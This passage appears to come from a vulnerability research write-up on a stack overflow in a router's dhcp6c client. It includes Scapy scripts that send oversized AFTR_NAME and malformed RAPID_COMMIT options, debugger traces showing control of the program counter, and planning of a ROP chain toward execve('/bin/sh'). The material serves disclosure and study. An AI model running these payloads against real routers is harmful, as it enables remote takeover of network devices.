Oct/29/2024 00:37:55: copy_option: set client ID (len 10) Oct/29/2024 00:37:55: copy_option: set elapsed time (len 2) Oct/29/2024 00:37:55: copy_option: set option request (len 2) Oct/29/2024 00:37:55: client6_send: send solicit to ff02::1:2%eth0 Oct/29/2024 00:37:55: dhcp6_reset_timer: reset a timer on eth0, state=SOLICIT, timeo=2, retrans=4132 Oct/29/2024 00:37:59: copy_option: set client ID (len 10) Oct/29/2024 00:37:59: copy_option: set elapsed time (len 2) Oct/29/2024 00:37:59: copy_option: set option request (len 2) Oct/29/2024 00:37:59: client6_send: send solicit to ff02::1:2%eth0 Oct/29/2024 00:37:59: dhcp6_reset_timer: reset a timer on eth0, state=SOLICIT, timeo=3, retrans=8289 Oct/29/2024 00:38:07: copy_option: set client ID (len 10) Oct/29/2024 00:38:07: copy_option: set elapsed time (len 2) Oct/29/2024 00:38:07: copy_option: set option request (len 2) Oct/29/2024 00:38:07: client6_send: send solicit to ff02::1:2%eth0 Oct/29/2024 00:38:07: dhcp6_reset_timer: reset a timer on eth0, state=SOLICIT, timeo=4, retrans=15930 As we said earlier, with option -i, we have a information-request message.\nRemember that the vulnerability concerns IPv6 and by default we already have an IPv4 address assigned to us.\nTake a look on qemu VM machine network configuration once more (previous). At first glance, we might think that there is already assigned IPv6 address on eth0.\nBut no, this is a link local addressee.\nIPv6 Link-Local Address: In IPv6, link-local addresses are automatically assigned to each interface and are in the fe80::/10 address range. For example, fe80::abcd:ef01:2345 might be a device’s link-local address.\nlink-local address An IPv6 address having a link-only scope, indicated by having the prefix (fe80::/10), that can be used to reach neighboring nodes attached to the same link. Every IPv6 interface on which DHCPv6 can reasonably be useful has a link-local address.\nNow we need to create our DHCPv6 server. As we already have an IPv4 address and can contact the host, we don’t really need a full functional dhcpv6 server to exploit our bug. According to RFC8415, we have the following flow when the client tries to get an IP address from DHCPv6 server.\nDHCPv6 flow\nAs we will need to build our own DHCPv6 packets that will be sent, we will use Scapy. The DHCPv6 server we will build will listen on a chosen interface for Solicit messages and respond with an advertise. Advertise messages will allow us to debug where the vulnerability exists because we know from here that AFTR_NAME options can be used in Advertise messages.\nWe can rely on Scapy DHCPv6 implementation to build our server.\nWe start first with a simple script that filters and prints the received solicit messages:\nfrom scapy.all import * from scapy.layers.dhcp6 import DHCP6_Solicit target_mac = \"00:11:22:33:44:55\" def filter_solicit_msg(pkt): return pkt.haslayer(DHCP6_Solicit) and pkt[Ether].src == target_mac interface = 'br0' response = sniff(iface=interface, filter=\"udp and port 546\", prn=lambda x: x.show(), lfilter=filter_solicit_msg) After executing this python script, we have :\n###[ Ethernet ]### dst = 33:33:00:01:00:02 src = 00:11:22:33:44:55 type = IPv6 ###[ IPv6 ]### version = 6 tc = 0 fl = 0 plen = 38 nh = UDP hlim = 1 src = fe80::211:22ff:fe33:4455 dst = ff02::1:2 ###[ UDP ]### sport = dhcpv6_client dport = dhcpv6_server len = 38 chksum = 0x2421 ###[ DHCPv6 Solicit Message ]### msgtype = SOLICIT trid = 0x650957 ###[ DHCP6 Client Identifier Option ]### optcode = CLIENTID optlen = 10 \\duid \\ |###[ DUID - Based on Link-layer Address ]### | type = Link-layer Address | hwtype = Ethernet (10Mb) | lladdr = 00:11:22:33:44:55 ###[ DHCP6 Elapsed Time Option ]### optcode = ELAPSED_TIME optlen = 2 elapsedtime= 1.02 sec ###[ DHCP6 Option Request Option ]### optcode = ORO optlen = 2 reqopts = [64] Now we continue to build our simple dhcpv6 server. We can follow https://github.com/secdev/scapy/blob/master/scapy/layers/dhcp6.py#L1795. As explained earlier, options are used to provide additional configuration information. According to RFC 8415 section 16.3, to build our advertise response, we need at least to provide client identifier and server identifier. The RFC explains more about what these options are.\nAnd Scapy already has a class to create them (DHCP6OptClientId and DHCP6OptServerId). By creating each layer for the DHCPv6 advertise message that will be sent, we have the following script with comments:\nfrom scapy.all import * from scapy.layers.inet6 import IPv6, UDP from scapy.layers.dhcp6 import DHCP6_Solicit, DHCP6OptServerId, DHCP6OptClientId ''' br0: flags=4419 mtu 1500 inet 10.212.81.52 netmask 255.255.0.0 broadcast 10.212.255.255 inet6 fe80::542b:76ce:631b:36ce prefixlen 64 scopeid 0x20 ether da:30:2c:48:59:a8 txqueuelen 1000 (Ethernet) RX packets 652899 bytes 434959083 (434.9 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 284487 bytes 81342637 (81.3 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ''' target_mac = \"00:11:22:33:44:55\" # qemu br0_mac = \"da:30:2c:48:59:a8\" br0_link_local_inet6 = \"fe80::542b:76ce:631b:36ce\" def filter_solicit_msg(pkt): return pkt.haslayer(DHCP6_Solicit) and pkt[Ether].src == target_mac def send_dhcp6_advertise(p): # Set up Ethernet layer with source and destination MAC addresses src_mac = br0_mac # Bridge interface MAC address dst_mac = p[Ether].src # Client's MAC address from original packet ethernet_layer = Ether(src=src_mac, dst=dst_mac) # Set up IPv6 layer with source and destination addresses ipv6_dst = p[IPv6].src # Client's IPv6 address from original packet ipv6_src = br0_link_local_inet6 # Bridge interface link-local address ipv6_layer = IPv6(src=ipv6_src, dst=ipv6_dst) # Set up UDP layer with DHCPv6 ports # Port 547: Server port, Port 546: Client port udp_layer = UDP(sport=547, dport=546) # Extract client DUID and transaction ID from original Solicit message client_duid = p[DHCP6OptClientId].duid trid = p[DHCP6_Solicit].trid dhcp6_advertise = DHCP6_Advertise(trid=trid) # Create DHCPv6 options client_id = DHCP6OptClientId(duid=client_duid) # Client Identifier option server_id = DHCP6OptServerId(duid=DUID_LLT(hwtype=1, lladdr=src_mac)) # Server Identifier option # Combine all layers and send packet pck = ethernet_layer / ipv6_layer / udp_layer / dhcp6_advertise / server_id / client_id sendp(pck, iface=\"br0\", verbose=False) interface = 'br0' response = sniff(iface=interface, filter=\"udp and port 546\", prn=send_dhcp6_advertise, lfilter=filter_solicit_msg) And on the qemu VM, we can see that the advertise message is received and dhcp6_get_options is called to get each options and then the client responds with a request message:\n/ # /usr/sbin/dhcp6c -dDf -c test.conf eth0 . . . Oct/30/2024 00:30:49: copy_option: set client ID (len 10) Oct/30/2024 00:30:49: copy_option: set elapsed time (len 2) Oct/30/2024 00:30:49: copy_option: set option request (len 2) Oct/30/2024 00:30:49: client6_send: send solicit to ff02::1:2%eth0 Oct/30/2024 00:30:49: dhcp6_reset_timer: reset a timer on eth0, state=SOLICIT, timeo=0, retrans=1072 Oct/30/2024 00:30:49: client6_recv: receive advertise from fe80::542b:76ce:631b:36ce%eth0 on eth0 Oct/30/2024 00:30:49: dhcp6_get_options: get DHCP option server ID, len 14 Oct/30/2024 00:30:49: DUID: 00:01:00:01:00:00:00:00:da:30:2c:48:59:a8 Oct/30/2024 00:30:49: dhcp6_get_options: get DHCP option client ID, len 10 Oct/30/2024 00:30:49: DUID: 00:03:00:01:00:11:22:33:44:55 Oct/30/2024 00:30:49: client6_recvadvert: server ID: 00:01:00:01:00:00:00:00:da:30:2c:48:59:a8, pref=-1 Oct/30/2024 00:30:49: client6_recvadvert: reset timer for eth0 to 0.973980 Oct/30/2024 00:30:50: select_server: picked a server (ID: 00:01:00:01:00:00:00:00:da:30:2c:48:59:a8) Oct/30/2024 00:30:50: client6_send: a new XID (a447e5) is generated Oct/30/2024 00:30:50: copy_option: set client ID (len 10) Oct/30/2024 00:30:50: copy_option: set server ID (len 14) Oct/30/2024 00:30:50: copy_option: set elapsed time (len 2) Oct/30/2024 00:30:50: copy_option: set option request (len 2) Oct/30/2024 00:30:50: client6_send: send request to ff02::1:2%eth0 . . . Analysis and debuging OK cool, now we have a working environment to start our debugging. We will use gdbserver to start the binary and connect to it from our host.\nIn the qemu VM we start gdbserver with the following command:\n./gdbserver-7.7.1-mipsel-mips32-v1 :1234 /usr/sbin/dhcp6c -dDf -c test.conf eth0 From our host using the qemu VM IP address:\nroot@dilag:# gdb-multiarch GNU gdb (Ubuntu 14.0.50.20230907-0ubuntu1) 14.0.50.20230907-git Copyright (C) 2023 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \"show copying\" and \"show warranty\" for details. This GDB was configured as \"x86_64-linux-gnu\". Type \"show configuration\" for configuration details. For bug reporting instructions, please see: . Find the GDB manual and other documentation resources online at: . For help, type \"help\". Type \"apropos word\" to search for commands related to \"word\". Loading GEF... GEF is ready, type 'gef' to start, 'gef config' to configure 304 commands loaded for GDB 14.0.50.20230907-git using Python engine 3.11 [+] Not found /root/.gef.rc, GEF uses default settings gef\u003e set architecture mips The target architecture is set to \"mips\". gef\u003e target remote 10.212.141.194:1234 We can now start our debugging. We already know from earlier analysis that the packet sent by the DHCPv6 server will be used to construct the pointer p which contains the raw data of all DHCPv6 options sent. Let’s add a breakpoint into the sub_405f08 function beginning and inspect the first argument which is the pointer we are looking for.\ngef\u003e b *0x405f08+1 Breakpoint 1 at 0x405f09 gef\u003e b *0x405f08+1 Breakpoint 1 at 0x405f09 gef\u003e c Continuing. Breakpoint 1, 0x00405f09 in ?? () . . . gef\u003e telescope $a0 -n $a0 0x7fffe5ec|+0x0000|+000: 0x0e000200 0x7fffe5f0|+0x0004|+001: 0x01000100 0x7fffe5f4|+0x0008|+002: 0x00000000 0x7fffe5f8|+0x000c|+003: 0x482c30da 0x7fffe5fc|+0x0010|+004: 0x0100a859 0x7fffe600|+0x0014|+005: 0x03000a00 0x7fffe604|+0x0018|+006: 0x11000100 0x7fffe608|+0x001c|+007: 0x55443322 For some reason we don’t know at this time, we need to add +1 to the address we get from Ghidra to get the correct disassembly instructions or correct pointer.\nSo this is our p pointer beginning. As we know that it is of type dhcp6opt we can deduce type and len for the first DHCPv6 options. We have the value 0x0e000200, and the definition is :\nstruct dhcp6opt { uint16_t dh6opt_type; uint16_t dh6opt_len; /* type-dependent data follows */ } __attribute__ ((__packed__)); Thus, we have:\ntype=0x0002 ==\u003e // SERVERID option according to https://datatracker.ietf.org/doc/html/rfc8415#section-24 len=0x000e data=server duid If we analyze the Advertise packet we sent through Wireshark, we can easily understand that the content at the p pointer that gets passed to the function is nothing than the options part of the packet we sent:\nThis confirms our intuition. The p content is just the raw data of all the DHCPv6 options part of our packet, which is under our control. This means that we can indeed control the content of the p pointer that get passed to the dhcp6_get_options function. The options we are interested in is the AFTR_NAME options, that is where our memcpy is. As we saw earlier the memcpy follows the pattern below, where cp is just the beginning of our AFTR_NAME options raw data, which we can indeed control:\nmemcpy(optinfo_something,cp,(uint16_t)(cp-\u003elen)); Let’s add this options to our packet and inspect the memcpy call. Unfortunately, there is no AFTR_NAME option implemented in Scapy. We will build it ourselves. To have more control over what we are doing, we will simply build this option as raw data using python bytes strings. But, first, we need to understand how DHCPv6 option is constructed. From the RFC, DHCP options follow the format below:\nWe can indeed confirm this format using the packet captured by Wireshark:\n0x0002 is the server Identifieroption code, 0x000e is the Length of this options, the following is server DUID which represent here the option data. Especially for AFTR_NAME, we have the following format and description:\nSo following the format we saw earlier, we will construct our dhcpv6 AFTR_NAME option. The option code is 64, length is the length of the payload, and then we will append the payload. The payload also follows a format described in the previous capture. The format of this payload needs to conform to the format of after_name described by the RFC. The length of each DNS label string must be specified, and the length will be converted to . started from the second one. The DNS label is normally limited to 63 octets. For example, in the above example, when the payload is \\x04aftr\\x07example\\x03com\\x00 , the result after the program parses it is aftr.example.com. Using this format and description, we write the following script:\ndef send_dhcp6_advertise(p): # Set up Ethernet layer with source and destination MAC addresses src_mac = br0_mac # Bridge interface MAC address dst_mac = p[Ether].src # Client's MAC address from original packet ethernet_layer = Ether(src=src_mac, dst=dst_mac) # Set up IPv6 layer with source and destination addresses ipv6_dst = p[IPv6].src # Client's IPv6 address from original packet ipv6_src = br0_link_local_inet6 # Bridge interface link-local address ipv6_layer = IPv6(src=ipv6_src, dst=ipv6_dst) # Set up UDP layer with DHCPv6 ports # Port 547: Server port, Port 546: Client port udp_layer = UDP(sport=547, dport=546) # Extract client DUID and transaction ID from original Solicit message client_duid = p[DHCP6OptClientId].duid trid = p[DHCP6_Solicit].trid dhcp6_advertise = DHCP6_Advertise(trid=trid) # Create DHCPv6 options client_id = DHCP6OptClientId(duid=client_duid) # Client Identifier option server_id = DHCP6OptServerId(duid=DUID_LLT(hwtype=1, lladdr=src_mac)) # Server Identifier option # AFTR_NAME option # \u003e\u003e\u003e hex(63) == '0x3f' code = b'\\x00\\x40' # aftr_name: size + string + size + string + ... + payload = (b'\\x30' + b'a' * 0x30) * 10 # very long AFTR_NAME aftr_name_option = code + (len(payload)).to_bytes(2, byteorder='big') + payload # Combine all layers and send packet pck = ethernet_layer / ipv6_layer / udp_layer / dhcp6_advertise / server_id / client_id / aftr_name_option sendp(pck, iface=\"br0\", verbose=False) For the payload, you can see that we create such a big AFTR_NAME (approximately more than 500 bytes). We will now inspect the memcpy call to see what happens, we just need to set a breakpoint before the memcpy and inspect the arguments:\ngef\u003e b *0x004061c6+1 Breakpoint 1 at 0x4061c7 gef\u003e c We can see this on the breakpoint hit:\n--------------------------------------------------------------------------------------------------- arguments (guessed) ---- 0x419261 \u003cNO_SYMBOL\u003e ( $a0 = 0xf793969a, $a1 = 0x7fffe611 -\u003e 0x61616161 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0aaaaaaaaaaaaaaa'..., $a2 = 0x00000030, $a3 = 0x00000000, [sp + 0x10] = 0x000003d4, [sp + 0x14] = 0x00000000 ) That is our memcpy call. We can see that the src(a1 register) is indeed our packet payload and the size (a2 register) is the size of each aftr_name part. Now we understand more clearly. The memcpy is copying each part of aftr_name into a buffer which will then be processed to form the final aftr_name (Example: \\x04aftr\\x07example\\x03com\\x00 will become aftr.example.com). If we look more closely to the destination pointer (a0 register), it is weird at first time but get correct stack address if we advance in one step in the code (after the branching). That is due to something called delay slot branching on MIPS architecture.\n[!note] On the MIPS architecture, jump and branch instructions have a “delay slot”. This means that the instruction after the jump or branch instruction is executed before the jump or branch is executed. In addition, there is a group of “branch likely” conditional branch instructions in which the instruction in the delay slot is executed only if the branch is taken. The MIPS processors execute the jump or branch instruction and the delay slot instruction as an indivisible unit. If an exception occurs as a result of executing the delay slot instruction, the branch or jump instruction is not executed, and the exception appears to have been caused by the jump or branch instruction. This takes some time to get used to when looking for gadgets. Each time a call/jump is performed, we need to look at the next instruction as well. This can mess up the gadget or actually provide a crucial instruction to make a gadget usable. https://www-local.pdc.kth.se/doc/totalview/wwhelp/wwhimpl/common/html/wwhelp.htm?context=Reference\u0026file=MIPSDelaySlotInstructions.html\ngef\u003e si warning: GDB can't find the start of the function at 0x419261. warning: GDB can't find the start of the function at 0x419261. 0x00419261 in ?? () [ Legend: Modified register | Code | Heap | Stack | Writable | ReadOnly | None | RWX | String ] ------------------------------------------------------------------------------------------------------------- registers ---- $zero/$r0 : 0x00000000 $at/$r1 : 0x1000a400 $v0/$r2 : 0x7fffead0 -\u003e 0x00000000 $v1/$r3 : 0x00000000 $a0/$r4 : 0x7fffead0 -\u003e 0x00000000 $a1/$r5 : 0x7fffe611 -\u003e 0x61616161 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0aaaaaaaaaaaaaaa'... $a2/$r6 : 0x00000030 $a3/$r7 : 0x00000000 $t0/$r8 : 0x00000000 $t1/$r9 : 0x00000000 $t2/$r10 : 0x00000000 $t3/$r11 : 0x656c202c (', le'?) $t4/$r12 : 0x86cefde4 $t5/$r13 : 0x780052c0 $t6/$r14 : 0x00000000 $t7/$r15 : 0x6e6f6974 ('tion'?) $s0/$r16 : 0x7fffe610 -\u003e 0x61616130 '0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0aaaaaaaaaaaaaa'... $s1/$r17 : 0x7fffe9e8 -\u003e 0x0000000a $s2/$r18 : 0x00000005 $s3/$r19 : 0x004018b1 -\u003e 0x0064f2f0 $s4/$r20 : 0x77ffb000 $s5/$r21 : 0x77ffb000 $s6/$r22 : 0x77ffe518 -\u003e 0x77f5b000 -\u003e 0x464c457f $s7/$r23 : 0x77fffd8c -\u003e 0x00000001 $t8/$r24 : 0x00000000 $t9/$r25 : 0x77f7d6fc -\u003e 0x3c1c0008 $k0/$r26 : 0x00000000 $k1/$r27 : 0x00000000 $gp/$r28 : 0x780052c0 $sp/$r29 : 0x7fffe110 -\u003e 0x00000007 $fp/$s8/$r30: 0x00000000 $ra/$r31 : 0x004061cd -\u003e 0x69922493 $sr : 0x0000a413 $lo : 0x00000000 $hi : 0x00000003 $bad : 0x00430024 -\u003e 0x77ffe390 -\u003e 0x00000000 $cause : 0x10800024 $fsr : 0x00000000 $fir : 0x00739300 $pc : 0x00419261 -\u003e 0x1a9a60b2 . . . gef\u003e gef\u003e print $a0 $2 = 0x7fffeb94 gef\u003e xinfo $a0 ------------------------------------- xinfo: 0x7fffeb94 ------------------------------------- [ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ] Start End Size Offset Perm Path 0x7ffde000 0x7ffff000 0x00021000 0x00000000 rw- [stack] \u003c- $v0, $a0, $a1, $t2, $s0, $s1, $sp Offset (from mapped): 0x7ffde000 + 0x20b94 The problem here is that the memcpy does the copy until the size to copy is 0 (we hit the end of payload or the \\x00 is explicitly specified in the payload). And since the destination buffer is on stack and has fixed length it will cause a stack overflow and we can overwrite some variables and pointers on stack. This is the vulnerability. Let’s hit continue in gdb and see what happens. As expected, we have a segfault.\ngef\u003e c Continuing. Program received signal SIGSEGV, Segmentation fault. 0x00402f0f in ?? () [ Legend: Modified register | Code | Heap | Stack | Writable | ReadOnly | None | RWX | String ] --------------------------------------------------------------------------------------------------------------------- registers ---- warning: GDB can't find the start of the function at 0x402f0f. GDB is unable to find the start of the function at 0x402f0f and thus can't determine the size of that function's stack frame. This means that GDB may be unable to access that stack frame, or the frames below it. This problem is most likely caused by an invalid program counter or stack pointer. However, if you think GDB should simply search farther back from 0x402f0f for code which looks like the beginning of a function, you can increase the range of the search using the `set heuristic-fence-post' command. $zero/$r0 : 0x00000000 $at/$r1 : 0x7fffe7fa -\u003e 0x000477e2 $v0/$r2 : 0x0090f3e9 $v1/$r3 : 0x61616161 ('aaaa'?) $a0/$r4 : 0xe9f39002 $a1/$r5 : 0x7fffe7f9 -\u003e 0x0477e261 $a2/$r6 : 0x00000001 $a3/$r7 : 0x00000010 $t0/$r8 : 0x00000001 $t1/$r9 : 0x0000000d $t2/$r10 : 0x7fffec8c -\u003e 0x61616161 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' $t3/$r11 : 0x61000000 $t4/$r12 : 0x87e91de4 $t5/$r13 : 0x780052c0 $t6/$r14 : 0x00000000 $t7/$r15 : 0x6e6f6974 ('tion'?) $s0/$r16 : 0x00413070 -\u003e 0x65766461 'advertise' $s1/$r17 : 0x7fffe5e8 -\u003e 0xe9f39002 $s2/$r18 : 0x00000005 $s3/$r19 : 0x004018b1 -\u003e 0x0064f2f0 $s4/$r20 : 0x77ffb000 $s5/$r21 : 0x77ffb000 $s6/$r22 : 0x77ffe518 -\u003e 0x77f5b000 -\u003e 0x464c457f $s7/$r23 : 0x77fffd8c -\u003e 0x00000001 $t8/$r24 : 0x0042a0d0 -\u003e 0x77faf6f0 -\u003e 0x7c0410a0 $t9/$r25 : 0x77faf6f0 -\u003e 0x7c0410a0 $k0/$r26 : 0x00000000 $k1/$r27 : 0x00000000 $gp/$r28 : 0x780052c0 $sp/$r29 : 0x7fffe1c8 -\u003e 0x7fffe5ec -\u003e 0x0e000200 $fp/$s8/$r30: 0x00000000 $ra/$r31 : 0x00402f05 -\u003e 0x6cb304f6 $sr : 0x0000a413 $lo : 0x00000000 $hi : 0x00000006 $bad : 0x61616169 ('iaaa'?) $cause : 0x10800010 $fsr : 0x00000000 $fir : 0x00739300 $pc : 0x00402f0f -\u003e 0x6e202e9b ------------------------------------------------------------------------------------------------------------------------- stack ---- $sp 0x7fffe1c8|+0x0000|+000: 0x7fffe5ec -\u003e 0x0e000200 0x7fffe1cc|+0x0004|+001: 0x7fffe7fa -\u003e 0x000477e2 \u003c- $at 0x7fffe1d0|+0x0008|+002: 0x004124cc -\u003e 0x65636572 'receive %s from %s on %s' 0x7fffe1d4|+0x000c|+003: 0x00413070 -\u003e 0x65766461 'advertise' \u003c- $s0 0x7fffe1d8|+0x0010|+004: 0x0042ad62 -\u003e 0x30386566 'fe80::542b:76ce:631b:36ce%eth0' 0x7fffe1dc|+0x0014|+005: 0x0042bfc0 -\u003e 0x30687465 'eth0' 0x7fffe1e0|+0x0018|+006: 0x00000000 0x7fffe1e4|+0x001c|+007: 0x00000000 ------------------------------------------------------------------------------------------------------------------ code:mips:32 ---- 0x402f03 6580 \u003cNO_SYMBOL\u003e nop 0x402f05 f604b36c \u003cNO_SYMBOL\u003e lw v1, 0x403588 0x402f09 ea81 \u003cNO_SYMBOL\u003e and v0, v1 -\u003e 0x402f0f 9b2e \u003cNO_SYMBOL\u003e lw s0, 8 (v1) 0x402f11 206e \u003cNO_SYMBOL\u003e beqz s0, 0x402f6f 0x402f13 986a \u003cNO_SYMBOL\u003e lw v1, 56 (s0) 0x402f15 ea30 \u003cNO_SYMBOL\u003e cmp v0, v1 0x402f17 6000 \u003cNO_SYMBOL\u003e bteqz 0x402f79 0x402f19 98fa \u003cNO_SYMBOL\u003e lw s0, 0 (s0) ----------------------------------------------------------------------------------------------------------------------- threads ---- [Thread Id:1, tid:3103] stopped at 0x00402f0f \u003cNO_SYMBOL\u003e, reason: SIGSEGV ------------------------------------------------------------------------------------------------------------------------- trace ---- -\u003e [#0] 0x00402f0f \u003cNO_SYMBOL\u003e --------------------------------- The program crashes when trying to execute lw s0, 8(v1). When looking at v1, we can see that it has been overwritten with aaaa. And the loading of that invalid address causes the crash. Now we have a crash we are pretty sure that there is a buffer overflow vulnerability in this function.\nImpact This vulnerability creates a critical security exposure at a network infrastructure level, potentially allowing attackers to:\nGain a Remote code execution on the router Pivot into the LAN network Intercept, modify, or redirect network communications Establish persistence within the network infrastructure Access internal network segments from external positions (as the vulnerability is triggered when attempts to get an IPv6 address from DHCP server i.e it is triggered from WAN side) Use the router in botnet network etc… Exploitation Path / Proof of Concept (PoC) Get control over program counter (pc) Now let’s check the protection in place:\nCanary is disabled so we can freely overwrite a return address. No PIE (Position Independent Executable) means that the binary load address is known and is fixed for all execution. No RELRO (RElocation Read-Only) means that the GOT(Global Offset Table is writable). NX(Non eXecutable) is enabled means that the stack is not executable i.e. we cannot just put a shellcode on the stack and jump to it. Let’s check if ASLR (Address Space Layout Randomization) is enabled.\nA value of 2 means that full ASLR is enabled, which means that the base addresses of the stack, heap, and libraries are randomized for each execution and we could not easily guess them. With all this setup, to successfully exploit this binary, we need to craft a ROP chain.\nNo let’s go back to our function. We saw earlier that there is a crash, but the program counter pc is not already under our control. We also noticed that the crash occurs in the binary. This means that there is crash somewhere before the function returns and thus the control flow cannot yet be hijacked.\nUsing the source code of the OPNsense Github project, let’s revisit the function where the crash occurs (client6_recv function).\nFrom previous analysis, we know that optinfo is populated using the memcpy in thedhcp6_get_options functions and optinfo is a struct on the stack. This is the buffer that is overflown. Let’s check what other variables are overwritten by this overflow.\nLet’s now take a look at what happens when the dhcp6_get_options succeeds.\nWe can quickly find out why the program crashes earlier before the function returns. Indeed, our payload overwrote the stack variables located after optinfo, especially the dh6 variable which is used in the switch case that follows the call to dhcp6_get_options. We need to avoid this crash. The first approach we can take to avoid it is to write a valid pointer into the dh6 so that when the programs tries to read dh6-\u003edh6_msgtype it works and then write a msgtype which will let us go to the default case to avoid using our corrupted dh6 (the default case only use the dh6-\u003edh6_msgtype to retrieve the message string to print). The second approach is more quick and straightforward and we don’t need to deal with shenanigans pointer. We can see that if dhcp6_get_options return value is less than 0 (dhcp6_get_options fails to properly parse an option) the function immediately returns. So we just need to find a way to craft an invalid option that will return a value less than 0. This will make the function return without crashing. Then, when returning, the saved return address will be popped from the stack. As this value was overwritten with our payload, we will now have control of the program counter pc. Let’s revisit the dhcp6_get_options function to see how to construct an invalid options. We can see that for some options, when there is error in the handling, we goto fail or goto malformed and return -1 which is less than 0.\nLet’s now find a simple DHCPv6 option that we can quickly make invalid option. The RAPID_COMMIT option is simple and perfect for our need:\ncase DH6OPT_RAPID_COMMIT: if (optlen != 0) goto malformed; optinfo-\u003erapidcommit = 1; break; By providing an optlen that is not 0 , we will go to the malformed label and return -1 Let’s use this in our python script:\n# 14=0xe = RAPID_COMMIT, normally len should be 0, but we want to trigger an error so voila code = b'\\x00\\x0e' payload = (b'\\x01') rapid_commit_option = code + (len(payload)).to_bytes(2, byteorder='big') + payload # Combine all layers and send packet pck = ethernet_layer / ipv6_layer / udp_layer / dhcp6_advertise / server_id / client_id / aftr_name_option / rapid_commit_option print(pck) sendp(pck, iface=\"br0\", verbose=False) We then restart the binary with the gdbserver. In Wireshark we can see that we successfully sent RAPID_COMMIT with len = 1 != 0.\nShortly, we have the segfault in GDB.\nWe can see that we now have control over pc. Now we need to find the offset to pc to build our ROP chain from there. Let’s use pwntools De Bruijn sequence generator. As we now know how everything work for AFTR_NAME options and that this program doesn’t check everything properly, we don’t need anymore to be RFC compliant, we can then use the sequence directly as payload like below.\npayload = cyclic(500) aftr_name_option = code + (len(payload)).to_bytes(2, byteorder='big') + payload And in GDB:\npc is at offset 421=0x1a5. We can now start thinking about how to build our ROP chain.\nBuild the ROP chain We need to construct a ROP chain that will allow us to execute commands on the router. Sometimes in this kind of binary there can exist a quick win gadgets that could directly allow us to execute command. To find such gadget, we can cross reference the function system or execve (or similar function) and search for function which use them. May be there is one awaiting us to fill our command in first argument. But in our case we didn’t find any such function. However by cross-referencing exceve, we found a gadget that looks promising.\ngef\u003e x/8i 0x40a8b6+1 0x40a8b7:\tlw\ta2,56(sp) 0x40a8b9:\tlw\ta0,136(sp) 0x40a8bb:\tjal\t0x419211 0x40a8bf:\taddiu\ta1,sp,44 0x40a8c1:\tjal\t0x4196e1 0x40a8c5:\tnop As we can see, a0, and a2 are loaded using a fixed offset from sp(stack pointer) register which content is under our control. This means that we can control what is loaded into a0 and a2. Also a stack address is loaded into a1, so we can control the content of this pointer. We also find the /bin/sh string in the binary at fixed location 0x0041317c.\n[+] Searching '/bin/sh' in whole memory [+] In '/usr/sbin/dhcp6c' (0x400000-0x41a000 [r-x]) 0x0041317c: 2f 62 69 6e 2f 73 68 00 65 63 68 6f 20 22 3d 3d | /bin/sh.echo \"== | [+] In '/lib/libc.so' (0x77f5b000-0x77fed000 [r-x]) 0x77fe8cac: 2f 62 69 6e 2f 73 68 0a 2f 62 69 6e 2f 63 73 68 | /bin/sh./bin/csh | 0x77feaad8: 2f 62 69 6e 2f 73 68 00 72 00 00 00 2f 64 65 76 | /bin/sh.r.../dev | [+] Searching '/\\x00b\\x00i\\x00n\\x00/\\x00s\\x00h\\x00' in whole memory So to properly call this execve gadget a0 (char *path) will be the address of /bin/sh strings and a2 (char *envp[]) will be set to NULL. a1 (char *argv[]) will be a pointer to our command strings pointer arrays (['/bin/sh', '-c', 'ls', NULL]). From our gadget, we understand that a1 will be a stack pointer, and we will need to craft our command strings pointers there. However, imagine if we write ls and -c in the stack in order to craft our pointers, we will need to know the location of the strings we wrote.\nAt first glance, we notice that even though /proc/sys/kernel/randomize_va_space content is 2, the stack is always loaded from the same address. That is the same for libraries. They are always at same address across execution. This means there is no ASLR and we can easily find where the command strings is written. We were so confused at this step. Why does the ASLR seem disabled even though the kernel configuration says it is enabled ? Furthermore CVE-2024-5243 exploit the same router with same vulnerable firmware version. In this blog post, they explain how they manage to get a code execution on this router with this version of firmware. We can see indeed that to bypass mitigations like ASLR, they use another CVE-2024-5244.\nOur plan for successful exploitation and remote code execution was to create a ROP chain (return-oriented programming) that leads to a `system (COMMAND)`. The problem we faced is address space layout randomization (ASLR); we could not guess the base addresses of the stack/heap/libs and needed to find a way to leak them in order to defeat ASLR, a mitigation in many operating systems against memory-based code-execution attacks. This was so confusing. The question is why do they need another CVE to leak the address if the address was already known ? Is our qemu setup causing the ASLR problem ? As we don’t have the router in hand we can’t confirm if ALSR is effectively enabled or not.\nBut let’s consider that ASLR is enabled and we cannot guess the address of stack, heap, libraries etc…\nAs we cannot guess where the stack is at runtime, we cannot used the previous execvegadgets directly. We need a way to write to a known address. We noticed that there is a rw region in the binary, starting from 0x42a000.\ngef\u003e vmmap [ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ] Start End Size Offset Perm Path 0x00400000 0x0041a000 0x0001a000 0x00000000 r-x /usr/sbin/dhcp6c \u003c- $s3 0x0042a000 0x0042b000 0x00001000 0x0001a000 rw- /usr/sbin/dhcp6c 0x0042b000 0x00481000 0x00056000 0x00000000 rwx [heap] 0x77df3000 0x77e0c000 0x00019000 0x00000000 r-x /lib/libeasylogger.so 0x77e0c000 0x77e0d000 0x00001000 0x00009000 rw- /lib/libeasylogger.so 0x77e0d000 0x77e12000 0x00005000 0x00000000 rw- 0x77e12000 0x77e27000 0x00015000 0x00000000 r-x /lib/libubox.so 0x77e27000 0x77e28000 0x00001000 0x00005000 rw- /lib/libubox.so 0x77e28000 0x77f0f000 0x000e7000 0x00000000 r-x /usr/lib/libiconv.so.2.4.0 0x77f0f000 0x77f10000 0x00001000 0x000d7000 rw- /usr/lib/libiconv.so.2.4.0 0x77f10000 0x77f26000 0x00016000 0x00000000 r-x /lib/libuci.so 0x77f26000 0x77f27000 0x00001000 0x00006000 rw- /lib/libuci.so 0x77f27000 0x77f49000 0x00022000 0x00000000 r-x /lib/libgcc_s.so.1 0x77f49000 0x77f4a000 0x00001000 0x00012000 rw- /lib/libgcc_s.so.1 